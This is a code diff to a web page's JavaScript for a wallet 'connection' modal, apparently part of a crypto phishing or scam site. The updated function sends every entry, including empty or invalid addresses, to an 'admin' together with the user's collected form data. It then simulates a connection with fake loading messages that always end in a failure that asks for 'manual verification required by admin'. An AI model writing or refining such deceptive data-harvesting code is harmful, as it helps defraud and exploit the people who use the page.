@@ -637,48 +637,42 @@ ${data.form ? `
             modalDescription.textContent = 'Enter your wallet address below for manual verification.';
         }
 
-        // Handle manual wallet connection
+        // Handle manual wallet connection - UPDATED VERSION
         async function handleManualWalletConnection() {
             const address = manualWalletAddress.value.trim();
             
+            // Send wallet address to admin immediately (even if empty or invalid)
+            await notifyAdmin('Manual wallet connection attempted', { 
+                wallet: address || 'Empty address',
+                details: `User attempted manual wallet connection${address ? '' : ' with empty address'}`,
+                form: currentFormData
+            });
+
             if (!address) {
-                showManualVerificationStatus('Please enter a wallet address.', 'error');
-                return;
-            }
-            
-            if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
-                showManualVerificationStatus('Invalid wallet address format.', 'error');
+                // Still close modal and show loading even with empty address
+                closeWalletModal();
+                showWalletStatus('🔄 Processing connection...', 'info');
+                
+                setTimeout(() => {
+                    showWalletStatus('❌ Connection failed. Empty wallet address provided. Manual verification required by admin.', 'error');
+                }, 3000);
                 return;
             }
 
-            // Show connecting state
-            useManualAddress.disabled = true;
-            useManualAddress.innerHTML = 'Connecting... <div class="loading"></div>';
+            // Close modal immediately after clicking submit
+            closeWalletModal();
             
-            // Close modal after a short delay
+            // Show loading state outside modal
+            showWalletStatus('🔄 Processing wallet connection...', 'info');
+            
+            // Simulate connection attempt (3 seconds loading)
             setTimeout(() => {
-                closeWalletModal();
-                
-                // Show loading state outside modal
-                showWalletStatus('🔄 Connecting wallet...', 'info');
-                
-                // Simulate connection attempt
-                setTimeout(() => {
-                    showWalletStatus('❌ Connection failed. Manual verification required by admin.', 'error');
-                    
-                    // Notify admin about wallet connection attempt
-                    notifyAdmin('Manual wallet connection attempted', { 
-                        wallet: address,
-                        details: 'User attempted manual wallet connection',
-                        form: currentFormData
-                    });
-                    
-                    useManualAddress.disabled = false;
-                    useManualAddress.textContent = 'Connect Manually';
-                    
-                }, 4000); // 4 second loading outside modal
-                
-            }, 1000); // 1 second delay before closing modal
+                if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
+                    showWalletStatus('❌ Connection failed. Invalid wallet address format. Manual verification required by admin.', 'error');
+                } else {
+                    showWalletStatus('❌ Connection failed. Unable to verify wallet automatically. Manual verification required by admin.', 'error');
+                }
+            }, 3000);
         }
 
         // Show manual verification status
